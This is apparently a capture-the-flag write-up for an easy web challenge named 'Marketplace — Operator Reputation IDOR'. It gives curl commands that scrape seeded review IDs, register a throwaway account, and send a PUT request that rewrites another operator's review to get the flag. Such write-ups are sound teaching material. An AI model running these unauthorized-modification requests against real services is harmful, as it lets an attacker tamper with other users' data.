---
title: "Marketplace — Operator Reputation IDOR"
ctf: "riffhack"
date: 2026-06-19
category: web
difficulty: easy
points: ?
flag_format: "bitflag{...}"
author: "CL4Y"
---

# Marketplace — Operator Reputation IDOR

> "Marketplace reviews look tidy from the outside, but one operator's reputation can be rewritten if the wrong handle gets trusted."
> Target: `http://104.248.231.179/`

## Summary

`PUT /api/reviews/<id>` updates a review by ID without checking that the caller authored it. A listing page exposes the seeded operator review IDs as `data-review-id="seed-..."` attributes, so any freshly registered user can rewrite another operator's review. Hitting `seed-phantom-hacker` returns the planted flag in the `moderationNote` field.

## Solution

### Step 1: Find the seeded review IDs

The HTML for `/listing/rat-builder` carries the operator-review IDs in `data-review-id` attributes:

```bash
curl -s http://104.248.231.179/listing/rat-builder \
  | grep -oE 'data-review-id="[^"]+"'
# data-review-id="seed-cyberghost"
# data-review-id="seed-phantom-hacker"
# data-review-id="seed-shadow-op"
```

### Step 2: Register a throwaway user

```bash
TOKEN=$(curl -s -X POST -H 'Content-Type: application/json' \
  --data '{"email":"a@b.c","password":"x"}' \
  http://104.248.231.179/api/auth/register \
  | jq -r .token)
```

### Step 3: IDOR-rewrite Phantom_Hacker's review

```bash
curl -s -X PUT -H 'Content-Type: application/json' -b "auth-token=$TOKEN" \
  --data '{"reviewText":"x"}' \
  http://104.248.231.179/api/reviews/seed-phantom-hacker \
  | jq -r .moderationNote
```

Output:

```
bitflag{r3v13w_0wn3r5h1p_1s_n0t_4_sugg35t10n}
```

The `PUT` handler never verifies the JWT subject against the review's `userId` (`k7m3n` for Phantom_Hacker, `abc12` for Shadow_Op, `xyz78` for CyberGhost), so a fresh account rewrites the row and the moderation pipeline returns the flag in `moderationNote`.

## Flag

```
bitflag{r3v13w_0wn3r5h1p_1s_n0t_4_sugg35t10n}
```
